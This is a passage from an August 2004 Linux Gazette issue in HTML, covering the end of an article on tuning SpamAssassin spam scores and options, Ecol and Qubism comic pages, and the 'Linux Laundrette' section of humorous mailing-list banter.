only scores 0.1. I'm going to treat it as almost conclusive and score
it at 3.0, requiring only another 0.5 points to trigger a match on my
threshold of 3.5.

<p>
Another email got through with these matches:

<pre>
X-Spam-Status: No, hits=1.5 required=3.5
        tests=GET_IT_NOW,HTML_10_20
        version=2.55
</pre>

Looking at my email, I find that HTML_10_20 matches a lot of legitimate
email, as well as spam and GET_IT_NOW only matches 1 spam.

<pre>
$ grep HTML_10_20 ~/Mail/spamtrap | wc -l
     19
$ grep HTML_10_20 ~/Mail/inbox ~/Mail/mailing-lists | wc -l
      8
$ grep GET_IT_NOW ~/Mail/inbox ~/Mail/mailing-lists | wc -l
      0
$ grep GET_IT_NOW ~/Mail/spamtrap  | wc -l
      1
$
</pre>

In this case I can't justify changing the scoring for either rule.


<h3>Upgrade SpamAssassin to the latest version</h3>

<p>
If, like me, you aren't running the very latest distribution you may
find that you are a little behind the curve. The standard rulesets are
always evolving and just running a more recent version should help to
catch more Spam.

<p>
As I write the latest stable version of SpamAssassin is 2.63 and 3.00
is under development. The latest versions can be downloaded from <a
href="http://spamassassin.apache.org/downloads.html">
http://spamassassin.apache.org/downloads.html</a>.


<h3>Install more rulesets</h3>
There are <a href="http://wiki.apache.org/spamassassin/CustomRulesets"> custom
rulesets</a> available on <a
href="http://wiki.apache.org/spamassassin/"> the 
SpamAssassin Wiki</a>, <A HREF="http://www.rulesemporium.com" > the SpamAssassin
Rules Emporium (SARE) </A>
and elsewhere.

<p>
I have not installed any of these rulesets and I am not recommending
any of them. You should read the documentation and evaluate their
suitability carefully before installing any new rulesets and monitor
the results once they are installed.


<a name="rules"></a><h3>Write your own rulesets</h3>

<p>
Rolling your own SpamAssassin rules is likely to be a minority
interest, but I guess it will appeal to some of our readers. If you
spot a pattern in your spam that there doesn't seem to be a rule for,
or you are just terminally curious then read <a href="http://mywebpages.comcast.net/mkettler/sa/SA-rules-howto.txt">
"A straightforward guide to writing your own add-on rules for
SpamAssassin"</a>, by Matt Kettler.

<h3>Other Options</h3>
As well as adjusting the scoring, there a a range of options with
which you can modify various aspects of SpamAssassin's behaviour. Here
are descriptions from the documentation for some that I consider
useful.

<pre>
    rewrite_subject { 0 | 1 } (default: 0)
        By default, the subject lines of suspected spam will not be tagged.
        This can be enabled here.

    always_add_headers { 0 | 1 } (default: 1)
        By default, X-Spam-Status, X-Spam-Checker-Version, (and optionally
        X-Spam-Level) will be added to all messages scanned by SpamAssassin.
        If you don't want to add the headers to non-spam, set this value to
        0. See also always_add_report.

    always_add_report { 0 | 1 } (default: 0)
        By default, mail tagged as spam includes a report, either in the
        headers or in an attachment (report_safe). If you set this to option
        to 1, the report will be included in the X-Spam-Report header, even
        if the message is not tagged as spam. Note that the report text
        always states that the mail is spam, since normally the report is
        only added if the mail is spam.

        This can be useful if you want to know what rules the mail
        triggered, and why it was not tagged as spam. See also
        always_add_headers.

    spam_level_stars { 0 | 1 } (default: 1)
        By default, a header field called "X-Spam-Level" will be added to
        the message, with its value set to a number of asterisks equal to
        the score of the message. In other words, for a message scoring 7.2
        points:

        X-Spam-Level: *******

        This can be useful for MUA rule creation.

    spam_level_char { x (some character, unquoted) } (default: *)
        By default, the "X-Spam-Level" header will use a '*' character with
        its length equal to the score of the message. Some people don't like
        escaping *s though, so you can set the character to anything with
        this option.

        In other words, for a message scoring 7.2 points with this option
        set to .

        X-Spam-Level: .......
</pre>

<h3>Further Information</h3>
To find out more about SpamAssassin check out <a
href="http://spamassassin.apache.org/"> the SpamAssassin web site</a> and
<a href="http://wiki.apache.org/spamassassin/FrequentlyAskedQuestions">
FAQ</a>.


</p>



<!-- *** BEGIN author bio *** -->
	<!-- *** BEGIN bio *** -->
<hr>
<p>
<img align="left" alt="[BIO]" src="../gx/authors/youngman.jpg" class="bio">

<em>

<p> Neil is a programmer, specialising in C++ on Unix and Linux. He has degrees
in Computer science and Next Generation Computing.

<p> Neil has worked on a wide range of systems from the control system for the
British Gas national grid to video servers for the Home Choice video on
demand service. He first programmed computers in 1980 with his school
General Studies class, which was allowed access to a mainframe at The
National Institute of Oceanography, programmed in Fortran on punch cards.

<p> A computer science degree followed at Queen Mary College, London, then Neil
worked for Logica for 3 years before taking an MSc in New Generation
Computing at Exeter University.

<p> The next 5 years saw Neil researching parallel simulation algorithms at the
Royal Signals and Radar Establishment, initially on transputers and
subsequently on SPARC based parallel systems. Since leaving RSRE, Neil has
mostly worked freelance and has worked on financial data feeds, video
servers and virus scanning proxies.

<p> Neil first used Unix at college in 1982 and started working on Linux in
1996.

<p> As of May 2004, Neil is working for Wirefast a global messaging company.

<p> Outside of computing, Neil is into motor sport, particularly Formula 1, the
World Rally Championship and the British Touring Car Championship. He
doesn't race himself. If you've seen Neil's driving, you'll understand why.

</em>
<br clear="all">
<!-- *** END bio *** -->



<!-- *** END author bio *** -->




<div id="articlefooter">



<p>
Copyright &copy; 2004, <A HREF="../authors/youngman.html">Neil Youngman</A>. Released under the
<a href="http://linuxgazette.net/copying.html">Open Publication license</a>
unless otherwise noted in the body of the article. Linux Gazette is not
produced, sponsored, or endorsed by its prior host, SSC, Inc.
</p>



<p>
Published in Issue 105 of Linux Gazette, August 2004
</p>

</div>

</div>


<div class="content lgcontent">

<a name="ecol"></a>
<h1>Ecol</h1>
<p id="by"><b>By <A HREF="../authors/malonda.html">Javier Malonda</A></b></p>


</b>
</p>


<p>
The Ecol comic strip is written for <a
href="http://escomposlinux.org">escomposlinux.org</a> (ECOL), the web site that
supports es.comp.os.linux, the Spanish USENET newsgroup for Linux.  The
strips are drawn in Spanish and then translated to English by the author.
<p>
<em>These images are scaled down to minimize horizontal scrolling.
	To see a panel in all its clarity, click on it.</em>

<p>

<div class="cartoon">
<a href="misc/ecol/ecol-164-e.png">
<img alt="[cartoon]" src="misc/ecol/ecol-164-e.png"></a>
<a href="misc/ecol/ecol-166-e.png">
<img alt="[cartoon]" src="misc/ecol/ecol-166-e.png"></a>
<a href="misc/ecol/ecol-167-e.png">
<img alt="[cartoon]" src="misc/ecol/ecol-167-e.png"></a>
</div>

<p>

All Ecol cartoons are at
<a href="http://tira.escomposlinux.org/">tira.escomposlinux.org</a> (Spanish),
<a href="http://comic.escomposlinux.org/">comic.escomposlinux.org</a> (English) 
and
<a href="http://tira.puntbarra.com/">http://tira.puntbarra.com/</a> (Catalan).
The Catalan version is translated by the people who run the site; only a few
episodes are currently available.

<p> <small>These cartoons are copyright Javier Malonda.  They may be copied,
linked or distributed by any means.  However, you may not distribute
modifications.  If you link to a cartoon, please <a
href="mailto:jmr@escomposlinux.org">notify</a> Javier, who would appreciate
hearing from you.
</small>

</p>



<!-- *** BEGIN author bio *** -->
	<!-- *** BEGIN bio *** -->
<hr>
<!-- P>
<img ALIGN="LEFT" ALT="[BIO]" SRC="../gx/2002/note.png" class="bio">
<em>
</em>
<br CLEAR="all" -->
<!-- *** END bio *** -->

<!-- *** END author bio *** -->




<div id="articlefooter">



<p>
Copyright &copy; 2004, <A HREF="../authors/malonda.html">Javier Malonda</A>. Released under the
<a href="http://linuxgazette.net/copying.html">Open Publication license</a>
unless otherwise noted in the body of the article. Linux Gazette is not
produced, sponsored, or endorsed by its prior host, SSC, Inc.
</p>



<p>
Published in Issue 105 of Linux Gazette, August 2004
</p>

</div>

</div>


<div class="content lgcontent">

<a name="qubism"></a>
<h1>Qubism</h1>
<p id="by"><b>By <A HREF="../authors/harsem.html">Jon "Sir Flakey" Harsem</A></b></p>


</b>
</p>


<p>
<p>
<em>These images are scaled down to minimize horizontal scrolling.
	To see a panel in all its clarity, click on it.</em>

<p>

<div class="cartoon">
<a href="misc/qubism/qb-gamedesignpc.jpg">
<img alt="[cartoon]" src="misc/qubism/qb-gamedesignpc.jpg"></a>
<a href="misc/qubism/qb-overrocking.jpg">
<img alt="[cartoon]" src="misc/qubism/qb-overrocking.jpg"></a>
</div>

<p>

All Qubism cartoons are
<a href="http://www.core.org.au/index.php?cat=9">here</a>
at the CORE web site.

</p>



<!-- *** BEGIN author bio *** -->
	<!-- *** BEGIN bio *** -->
<hr>
<P>
<img ALIGN="LEFT" ALT="[BIO]" SRC="../gx/2002/note.png" class="bio">
<em>
Jon is the creator of the Qubism cartoon strip and current
Editor-in-Chief of the 
<A HREF="http://www.core.org.au/">CORE</A> News Site.  
Somewhere along the early stages of
his life he picked up a pencil and started drawing on the wallpaper.  Now
his cartoons appear 5 days a week on-line, go figure. He confesses to
owning a Mac but swears it is for "personal use".
</em>
<br CLEAR="all">
<!-- *** END bio *** -->

<!-- *** END author bio *** -->




<div id="articlefooter">



<p>
Copyright &copy; 2004, <A HREF="../authors/harsem.html">Jon "Sir Flakey" Harsem</A>. Released under the
<a href="http://linuxgazette.net/copying.html">Open Publication license</a>
unless otherwise noted in the body of the article. Linux Gazette is not
produced, sponsored, or endorsed by its prior host, SSC, Inc.
</p>



<p>
Published in Issue 105 of Linux Gazette, August 2004
</p>

</div>

</div>


<div class="content lgcontent">

<a name="lg_laundrette"></a>
<h1>The Linux Laundrette</h1>


</b>
</p>


<p>
<ul>
<li><a href="#notlinux">Not Linux</a></li>
<li><a href="#spam-joke">Spam Joke</a></li>
<li><a href="#419">419</a></li>
<li><a href="#hellsed">Hell's Editors</a></li>
<li><a href="#tm">Trademarks</a></li>
<li><a href="#fed">Fed and Burped</a></li>
<li><a href="#reallife">Real Life</a></li>
<li><a href="#bed">Bed Time</a></li>
<li><a href="#imd">In my day...</a></li>
<li><a href="#advertising">Advertising</a></li>
<li><a href="#blink">Blink</a></li>
<li><a href="#homework">Homework help</a></li>
<li>Wacko Topic of the Month - <a href="#dead">Dead Languages</a></li>
<li>Wacko Topic of the Month - <a href="#russell">Russell's Paradox</a></li>
<li><a href="#could-have">It could have happened...</a></li>
<li><a href="#irony">Iraq-related Irony</a></li>
<li><a href="#sublime">Subliminal advertising</a></li>
<li><a href="#context">Context</a></li>
<li><a href="#mgm">Moaning Goat</a></li>
<li><a href="#esp">ESP</a></li>
<li><a href="#linguini">Linguini</a></li>
<li><a href="#macbeth">MacBeth</a></li>
<li><a href="#kgxdm">Display Managers</a></li>
<li><a href="#cheer">Good Cheer</a></li>
<li><a href="#hallucinating">Hallucinating</a></li>
</ul>
<hr width="80%">
<a name="notlinux"></a>
<h3>Not Linux</h3>

<p> There's another lengthy <a href="misc/lg_laundrette/notlinux.html">Not 
Linux</a> thread this month, courtesy of The Off-Topic Gang, which touches
on just about everything from hydrogen fuel to science centres to politics.

<p> There's also <a href="misc/lg_laundrette/python.html">The Case of the Mad
Python Programmer</a>.

<p> Here's a list of <a href="http://jill.jazzkeyboard.com/qarticles.html">funny 
Microsoft Knowledge Base articles</a>. My favourite, even if it isn't a 
<em>real</em> KB article, is: <a 
href="http://www.geocities.com/boxing4d/Q209354.htm">Q209354: HOW TO: RTFM</a>: 
"This article demonstrates how to read the f*cking manual, as popularised by 
the RTFM directive."

<p>The Register has an <a 
href="http://www.theregister.co.uk/2004/07/09/419_scam_anatomy/print.html">anatomy
of a 419 scam</a>, as well as a <a 
href="http://www.theregister.co.uk/2004/07/20/musical_preference_survey/">survey</a> 
of the musical tastes of computer professionals. 

<p> Linspire have a funny parody of The Doors' "Light My Fire". Take a look
at <a href="http://www.linspire.com/run_linspire.php">"Run Linspire"</a>, if
you have a Flash player.

<p> For those who regularly read "The Foolish Things We Do With Our Computers",
there's <a href="http://www.theregister.co.uk/2002/10/11/102_ways_to_kill_your/">102
ways to kill your computer</a>, and <a href="http://rinkworks.com/stupid/">Computer
stupidities</a>.

<p> Lastly, I found myself interested in some spam this month, from
"The Sith Co, LTD"; until I found out that this was pr0n, and not a company
started by actual <a href="http://en.wikipedia.org/wiki/Sith">Sith</a>.

<hr width="80%">
<a name="spam-joke"></a>
<h3>Spam Joke</h3>
<blockquote><em>
Who'd've thunk it? Something interesting in Spam 
</em></blockquote>
<!-- FIXME: Title & comment -->
<p>A Texan farmer goes to Australia for a vacation. There he meets an
Aussie farmer and gets talking. The Aussie shows off his big wheat
field and the Texan says, "Oh! We have wheat fields that are at least
twice as large."
</p>
<p>Then they walk around the ranch a little, and the Aussie shows off
his herd of cattle. The Texan immediately says, "We have longhorns that
are at least twice as large as your cows."
</p>
<p>The conversation has, meanwhile, almost died when the Texan sees a
herd of kangaroos hopping through the field in the distance. Amazed, he
asks, "What the hell are those?!"
</p>
<p>The Aussie replies with an incredulous look, "Don't you have any
grasshoppers in Texas?"
</p>
<hr width="80%">
<a name="419"></a>
<h3>419</h3>
<p><strong>[Sluggo]</strong>
<a
 href="http://seattlepi.nwsource.com/local/aplocal_story.asp?category=6420&amp;slug=WA%20Woman%20Sentenced">Woman
falls for 419 scam</a>, steals $670,000 from clients, gets 37 months in
prison
</p>
<blockquote><em>
It's a little known fact that there was originally an 11th commandment, "Thou
shalt not be gullible", but bringing that up might lead to a repeat of
a discussion about <a
href="http://en.wikipedia.org/wiki/Ten_Commandments">the
order of the Ten Commandments</a>. <br>
Also, it's saddening to note that <a
 href="http://www.cogsci.princeton.edu/%7Ewn/">WordNet</a>, the open
source dictionary/thesaurus, <a
 href="http://www.cogsci.princeton.edu/cgi-bin/webwn2.0?stage=1&amp;word=gullible">lacks
a definition for "gullible"</a>. </em></blockquote>

<hr width="80%">
<a name="hellsed"></a>
<h3>Hell's Editors</h3>

<p>
<strong>[Ben]</strong>
So, I went and did it. Perhaps inspired by Jay's example, or maybe
because I've been thinking about it for a long time now - and a pilot
friend of mine had this one for sale at a great price.

<p>
Whew. Sure brings back a lot of memories. Racing, cruising, long rides
on the backroads of California and New York...

<p>
<a href="http://okopnik.freeshell.org/img/nighthawk750.jpg">&lt;http://okopnik.freeshell.org/img/nighthawk750.jpg&gt;</a>


<hr width="80%">
<a name="tm"></a>
<h3>Trademarks</h3>
<p><strong>[Sluggo]</strong>
I found a "tm" image on the TOC template a couple hours ago.
</p>
<p>
<strong>[Rick]</strong>
You could put a "Price: 50 zorkmids" sign on it; it would have the same
effect. ;-&gt;
</p>
<p>
<strong>[Ben]</strong>
<strong>*Say*</strong>, that's not a bad idea... we might as well make
our fortunes on this thing while the going's good. But make it 200
zorkmids; baby needs shoes.
</p>

<hr width="80%">
<a name="fed"></a>
<h3>Fed and Burped</h3>
<p><strong>[Ben]</strong>
The sorting machine has been fed and burped, and seems satisfied with
the changes.
</p>
<p><strong>[Jimmy]</strong>
Don't forget what comes next with that analogy... </p>
<p><strong>[Ben]</strong>
[laugh] Fortunate folks that we are, with computers that comes <em>first</em>.
The "seems satisfied" part comes at the end.
</p>
<hr width="80%">
<a name="reallife"></a>
<h3>Real Life</h3>
<p><strong>[Frodo]</strong>
PS: I know I have been quiet lately... "Real life" and such kept me
kinda busy. Things look like they might be calming down a bit, pretty
soon, though.
</p>
<p><strong>[Ben]</strong>
Yeah, I know all about that. Man, that Real Life thing... it's weird,
isn't it? Wonder if there's a pill you can take or something. Take
heart, though: I hear it goes away after a while. Happens a lot faster
if you can hold your breath long enough, too.
</p>
<hr width="80%">
<a name="bed"></a>
<h3>Bed Time</h3>
<p><small>
<pre>Date: Sun, 04 Jul 2004 04:19:37 +0100</pre>
</small></p>
<p><strong>[Thomas]</strong>
Jimmy, ought you to be asleep?
</p>
<p><small>
<pre>Date: Sun, 04 Jul 2004 04:28:27 +0100</pre>
</small></p>
<p><strong>[Jimmy]</strong>
Yes, and I might ask the same of you!
</p>
<p><small>
<pre>Date: Sat, 03 Jul 2004 23:48:09 -0400</pre>
</small></p>
<p><strong>[Ben]</strong>
All right, that's it. Both of you young men get to bed, or there'll be
no dessert for you at dinner tomorrow! I mean, tonight.
</p>
<hr width="80%">
<a name="imd"></a>
<h3>In my day...</h3>
<p><strong>[Jay]</strong>
No motion on the mailing list stuff yet; sorry. No reply from Barry,
(surprisingly), and I've been hip-deep in sheep-dip the past week, as
well as down sick Thu and Fri. MWIKM.
</p>
<p><strong>[Ben]</strong>
"My Wombat Is a Known Maniac"? Don't know that one. Sucks that you've
been sick, though. The list issues can wait; you get better, dammit. </p>
<blockquote>
  <p><strong>[Jay]</strong>
It was mostly just sleep-a-lot sick; went to bed Thu 1500, up for a
couple hours at 21; slept most of Friday. </p>
  <p>"More When I Know More" &lt;tm Jerry Pournelle&gt; </p>
</blockquote>
<p>
<strong>[Ben]</strong>
What with Mick coming off his bike and getting banged up (he's all
right
now, in spite of the efforts of the congenital morons at his local
hospital), Jimmy playing his guitar till his wristbones fell out, and
you slacking off just because your temperature is over 120, this place
is going to hell in a handbasket. Why, in my day, people came to work
even if somebody set'em on fire! (Made for a brisk business in fire
extinguishers, lemme tell ya.) One fella dragged himself in and
wouldn't leave until the company doctor sent him home for being dead.
That's what <strong>I</strong> call commitment.
</p>
<blockquote>
  <p><strong>[Jimmy]</strong>
Yeah, you're one to talk, going around looking for hurricanes to play
in! </p>
</blockquote>
<p>
<strong>[Jay]</strong>
Start a man a fire and he'll be warm for a night.<br>
Set a man on fire and he'll be warm for the rest of his life.
</p>
<p><strong>[Jimmy]</strong>
"[He] sounded like a man straining to see a light at the end of the
tunnel. ... It had turned out that the end of the tunnel was on fire."
</p>
<p>
<strong>[Jason]</strong>
``<br>
<tt>~$ fortune -i -m 'light at the end'</tt><br>
(miscellaneous)<br>
%<br>
If we see the light at the end of the tunnel, it's the light of an<br>
oncoming train.
		-- Robert Lowell<br>
%<br>
(platitudes)<br>
%<br>
The light at the end of the tunnel is the headlight of an approaching train.<br>
%<br>
The light at the end of the tunnel may be an oncoming dragon.<br>
%<br>
We have seen the light at the end of the tunnel, and it's out.<br>
%<br>
~$<br>
''

<p>
<strong>[Ashwin N]</strong>
One more ...<br>
"The light at the end of the tunnel has been switched off since you didn't 
pay your bills"
<hr width="80%">
<!-- FIXME: Approval -->
<a name="advertising"></a>
<h3>Advertising</h3>
<p><strong>[Jimmy]</strong>
Thanks. I'm thinking about becoming a writer when I grow up </p>
<p><strong>[Ben]</strong>
As long as it's not an advertising writer. You don't want to have the
guys with the pitchforks and the red suits waiting for you at the end.
</p>
<p><strong>[Jimmy]</strong>
Uh... you mean that <em>when</em> I go to hell, I don't want to go
straight into a management position? </p>
<p><strong>[Ben]</strong>
Well, that's a hell of a way to reframe the situation! Maybe you are
ready to go into advertising. </p>
<p><strong>[Jimmy]</strong>
Well... I <em>have</em> been advertising LG... uh oh!
</p>
<p>Phew, I can still tell a truth without coming out in a rash!
</p>
<p><strong>[Ben]</strong>
Tisk. I guess you're not ready for the Big Leagues yet.
</p>
<p><strong>[Jimmy]</strong>
Nope. Haven't started speaking in slogans or nuthin'.
</p>
<blockquote><em>Sadly, a mere three days later, Ben showed that it was
he who had fallen victim
to the tempatations of advertising: </em></blockquote>
<p>
<strong>[Ben]</strong>
Are your games running slowly, even though you have the latest whizbang
video card? Is your Quake action more like a slow-motion low-crawl
through Jell-O than a high-FPS F(irst) P(erson) S(hooter)? You may be
using software emulation of direct rendering (DRI) instead of the real
thing, or may have outdated (or missing) GL libraries.<br>
</p>
<hr width="80%">
<a name="blink"></a>
<h3>Blink</h3>
<p><strong>[Rick]</strong>
</p>
<center>&lt;BLINK&gt;Resize your browser so the following line touches
both margins!&lt;/BLINK&gt;<br>
&lt;HR WIDTH="75%"&gt;
</center>
<p>
<strong>[Jay]</strong>
Um... I don't get it. <img alt=";-)" src="../gx/dennis/smily.gif" width="20" height="24">
</p>
<hr width="80%">
<a name="homework"></a>
<h3>Homework help</h3>
<p>
<strong>[Sanjib Roy]</strong>
how can i Clear Screen and Move Cursor to print a message in the
screen from a C program that uses standard C function like printf()
putch() without using ncurses.

<p>
<strong>[Thomas]</strong>
I'd ask your lecturer this one.

<p>
<strong>[Sanjib Roy]</strong>
Is there any function such as "clrscr()" and gotoxy() that are
available in Dos based Turbo C++ compiler are available in Linux if
not what is alternative
 
<p>
PLEASE HELP ME

<p>
<strong>[Thomas]</strong>
Homework getting you down? Good, don't ask us, we won't help. 
<img alt=":)" src="../gx/dennis/smily.gif" width="20" height="24">

<hr width="80%">
<a name="dead"></a>
<h2>Wacko Topic of the Month</h2>
<h3>Dead Languages</h3>
<blockquote><em>
	Latin's a dead language,<br>
	As dead as dead can be.<br>
	It killed off all the Romans<br>
	And now it's killing me.
</em></blockquote>

<p>
<strong>[Jack Carlson]</strong>
Have a great day.
 
Pax,
Jack Carlson

<p>
<strong>[Ben]</strong>
<em>Et pax vobiscum</em> as well, Jack. <img alt=":)" src="../gx/dennis/smily.gif" width="20" height="24">

<p>
<strong>[Jason]</strong>
Ben, you should only copy commonly used Latin phrases verbatim,
otherwise it confuses me. <img alt=":-)" src="../gx/dennis/smily.gif" width="20" height="24">

<p>
"AND peace be with you", right?

<p>
<strong>[Ben]</strong>
'Copy'? 

<blockquote><p>
<strong>[Jason]</strong>
Well, for a small-minded person such as myself, it would be mindless
"copying", not actual understanding of a language, just as someone who
does not really understand what's going on tends to do things like use
"--force" for rpm when it "doesn't work", hoping that using it will
magically fix their problems, without ever having to understand
anything.
</blockquote>

<p>
<strong>[Ben]</strong>
I've been into Roman history for the last several years, and
hanging out with a bunch of like-minded folks at novaroma.org for just
about the same length of time. 'Salve iterum, Amice' is not an unusual
greeting for me to write these days, and 'SVBEEV' (Si vales, bene est,
ego valeo) is a fairly common way to end an email when writing to other
Novaromans - although I generally prefer 'Vale' or 'Cura ut valeas'.

<p>
I don't claim that my Latin is anything but rudimentary, but salutations
aren't particularly complex. Well, actually, they are <img alt=":)" 
src="../gx/dennis/smily.gif" width="20" height="24">  - but not a
simple 'hello/goodbye" between strangers; it's when you get into
relatives and people of different status levels that it gets crazy. For
a full treatment, see Eleanor Dickey's "Latin Forms of Address"
(Oxford University Press, 2002).

<p>
<strong>[Jason]</strong>
Ugh. TAG makes me sick. No matter the topic, there's someone who's more
knowledgeable in it than me. <img alt=":-)" src="../gx/dennis/smily.gif" 
width="20" height="24">

<p>
<strong>[Breen]</strong>
That's the kind of thing that keeps me alive (and sane)!

<p>
<strong>[Jason]</strong>
Err, yes, well of course if you were talking in terms of solving
problems and getting work done, *then* it would be a good thing. 
<img alt=":-)" src="../gx/dennis/smily.gif" width="20" height="24">

<p>
I just sometimes think it would be nice, if, for example, I said "I
haven't read 'War and Peace'" and then somebody else would say, for
example, "neither have I" instead of "polished that off during my lunch
break today."

<blockquote><p>
<strong>[Frodo]</strong>
I knew there had to be someone else out there, who did not read "War and
Peace"... /me feels better now <strong>*G*</strong></blockquote>

<p>
<strong>[Ben]</strong>
I'm with Breen on this one. I love the fact that, when I find myself
floundering about while trying to spread the word about LG, Jimmy steps
up to the bat, says "that's easy", and hits a bunch of home runs in
various Linux venues. I'm just stoked when I'm stuck behind a firewall,
and Karl-Heinz comes up with some deep SSH hackery which allows me to
get and send my mail without a lot of hassle. By the same token, it
gives me pleasure when I can help the other folks here past a problem in
return.

<pre class="code">
 "We should not be crippled by the knowledge that no one of us can know
 what all of us together know."
  -- The Shockwave Rider, John Brunner
</pre>
Besides which,

<pre class="code">
A well-rounded geek should be able to geek about anything.
  -- nicolai@esperi.org
</pre>

If I'm not mistaken, we've got several well-rounded geeks here...
although I have lost a bunch of weight lately. 

<p>
<strong>[Jay]</strong>
That explains nicely how I feel when I visit the USF main campus
library.

<p>
<strong>[Ben]</strong>
[smile] Yeah. Libraries, I love'em. Centers of propagation of human
knowledge, <b>for free</b>. One of the finest achievements of the human race,
to my mind, and the only ray of hope for some of the folks trying to
crawl out of the muck; I damn near _lived_ in one for a few years after
coming to the States. I can't even begin to express how outraged and
scandalized I was when Baltimore - "The City That Reads", if you can
believe the incredible gall of the bastards! - decided to close a number
of their branch libraries. I - simply - have - not - the - words.

<p>
Somebody there must have experienced a fraction of a second of shame, or
at least the basic decency necessary to cover the face of the deceased -
they removed the magnetic stick-on signs with the above motto from the
city trucks (but not the buses, where it was painted on) shortly
thereafter.

<p>
<strong>[Jason]</strong>
But in the end, I must agree with you: I wouldn't have TAG any other way.
<hr width="80%">
<a name="russell"></a>
<h3>Russell's Paradox</h3>
<p>
<strong>[Kapil]</strong>
The barber who shaves everyone with a stubble except himself.

<p>The regex that matches every (...) except itself.

<p>Sounds like a Russell/Godel-esque construction!

<p>
<strong>[Thomas]</strong>
Well, when I was studying Russell's paradox, I distinctly remember my
lecturer using the anaology:

<p>
"Once there was a barber of a small village who shaved the head of every
man who did not shave their own head. Did he shave his own head?"

<p>
... and then I wished he'd never posed the question! :D

<p>
<strong>[Ben]</strong>
That's hilariously apropos. The Perl Quiz of The Week (qotw) challenge
this week is to write a basic logic parser, and Russel's Paradox has
seen a bit of discussion on that list... and I've just come back from my
massage therapist, who mentioned Russel's Paradox as something he
recently heard about in a "History of Science" course he took.

<p>
The available evidence says that we're moving toward a logical world.
Just think, no one will believe Bush anymore... oh, oops.

<p>
&lt;/politics&gt; <img alt=":)" src="../gx/dennis/smily.gif" width="20" 
height="24">

<p>
<strong>[Rick]</strong>
Personally, I won't join any logicians' club that would have me as a
member.  But anyway:

<blockquote>
<strong>[Ben]</strong>
Ah - a closet <a 
href="http://www.brainyquote.com/quotes/quotes/g/grouchomar122546.html">Marxist</a>, 
are you?
</blockquote>

<p>
<strong>[Rick]</strong>
Here's a piece you may find amusing, concerning Goodman's Paradox:
<a href="http://linuxmafia.com/pub/skeptic/files-to-classify/goodman.txt">
http://linuxmafia.com/pub/skeptic/files-to-classify/goodman.txt</a>

<p>
<strong>[Ben]</strong>
Oh, what a <b>beeeyootiful</b> perspective shift. Much better than "a white
handkerchief proves all ravens are black", which is enough to drive me
away screaming after just a few minutes of trying to understand it
(until I recall that <em>logic</em> has nothing to do with <em>truth,</em> at 
least.)

<p>
<strong>[Rick]</strong>
I think I was already laughing my ass off <em>before</em> that bit about "Since
Marby is losing his cool and beginning to turn grue" (not to mention "Do
you smell a garden path? If so, what color is it?"), but that did help
significantly.

<blockquote>
<strong>[Ben]</strong>
Yeah. It fit squarely within my favorite category of humor. I mean, it's
not the Three Stooges, but you can't have perfection <em>every</em> time. 
<img alt=":)" src="../gx/dennis/smily.gif" width="20" height="24">
</blockquote>

<p>
<strong>[Rick]</strong>
The piece was originally published in <em>BASIS</em>, newsletter of the Bay
Area Skeptics, a group I helped run for a long time (that, as originally
conceived and run, made something of a specialty of those sorts of "Not
so fast with the logical-positivist orthodoxy, fellah" pieces).

<p>
<strong>[Ben]</strong>
Wow, that's been around for a while; since the paleolithic times, by Web
standards. 
<blockquote>
<strong>[Rick]</strong>
The (mostly) monthly newsletter was founded in August 1982, if memory
serves.
</blockquote>
<p>
<strong>[Ben]</strong>
I'm surprised that they don't have a machinable format for
the newsletter. Great fun reading the previous issues, though.

<p>
<strong>[Rick]</strong>
I personally retyped into machine format many years' worth of prior
issues, but then later was so annoyed about the radically changed
direction of the group and its pissant new Chair (and their casual
misappropriation of my copyrighted work at his direction) that I removed
from the Net for several years all of the back issues I'd been hosting.  
Later, I put most of those back.

<p>
See also:<br>
<a href="http://linuxmafia.com/bas/">http://linuxmafia.com/bas/</a>

<p>
Oh well.

<p>
All of the issues <b>I</b> created (during my term as _BASIS_ editor) had
machine-readable forms.  I kept pleading with the other editors, during
their terms at that post, to retain and archive their electronic work
files to make it easier on my typing fingers -- but that mostly didn't
happen.

<hr width="80%">
<a name="could-have"></a>
<h3>It could have happened...</h3>
<p>
<strong>[Ben]</strong>
Contrary to popular belief, [Perl's] mascot's name is <em>not</em> "OCaml".
Sheesh.

<blockquote>
<p>
<strong>[Thomas]</strong>
Depends how you say it. <img alt=":)" src="../gx/dennis/smily.gif" width="20" 
height="24"> Usually with perl, it is with heavy surprise
with lots of skepticism thrown in for good measure. <img 
alt=":D" src="../gx/dennis/smily.gif" width="20" height="24">

<p>
<strong>[Ben]</strong>
Well, the way people seems to usually "learn" Perl (i.e., by looking at
somebody's horrible code, figuring "I can do that!", and proceeding to
do <em>exactly</em> that), I'd think it's more like "prayerfully, with a quiver
in the voice and tears running down the cheeks". People who learn it the
right way - i.e., by reading and following the documentation and learning
from <em>good</em> examples (e.g., PPT, NMS &lt;<a 
href="http://nms-cgi.sourceforge.net/">http://nms-cgi.sourceforge.net/</a>&gt;,
etc.) - say it with a rising inflection, sorta singing the last part,
and usually follow it up with a whistle.

<p>
"O Caaaa-mel! [whistle] Heeere, Camel-camel-camel!"

<p>
It always comes running and wagging its tail when properly invoked.
Beware the fleas, though. <img alt=":)" src="../gx/dennis/smily.gif" width="20" height="24">

<p>
<strong>[Thomas]</strong>
"Programming in Ruby is like being hugged." -- Greg McIntyre, Ruby
programmer.

<p>
<strong>[Ben]</strong>
Awww. That's *cute*.

<p>
<strong>[Jay]</strong>
Sure.  But that doesn't mean that the programming is fun.  <img alt=":-)" src="../gx/dennis/smily.gif" width="20" height="24">
 
<p>
I hate user-obsequious computers.

<p>
<strong>[Ben]</strong>
Jay's version of Hell: being locked in a room with Another Fine Product
Of The Sirius Cybernetics Corporation.
</blockquote>

<p>
<strong>[Jimmy]</strong>
Someone actually thinks that?

<p>
<strong>[Ben]</strong>
Probably not, but it's silly - and probable enough - to laugh at. <img alt=":)" src="../gx/dennis/smily.gif" width="20" height="24">

<p>
<strong>[Jay]</strong>
"It could have happened, therefore it must have happened."

<blockquote><em>
That's the advantage of space. It's big enough to hold practically 
</em>anything<em>, and so, eventually, it does. -- Terry Pratchett, "The Last 
Hero"
</em></blockquote>
<p>
<strong>[Ben]</strong>
Ah, apocrypha. This meme <em>will</em> come back to haunt me one day, I'm sure.

<p>
<strong>[Jay]</strong>
<img alt=":-)" src="../gx/dennis/smily.gif" width="20" height="24">

No, that's the slogan for <a href="news:alt.folklore.urban">alt.folklore.urban</a>.

<p>
<strong>[Ben]</strong>
Memes'R'Us! We perform remote, self-replicating in-brain installations.
We also offer earworms (The Barney Song, etc.) at a discount - get yours
today!

<hr width="80%">
<a name="irony"></a>
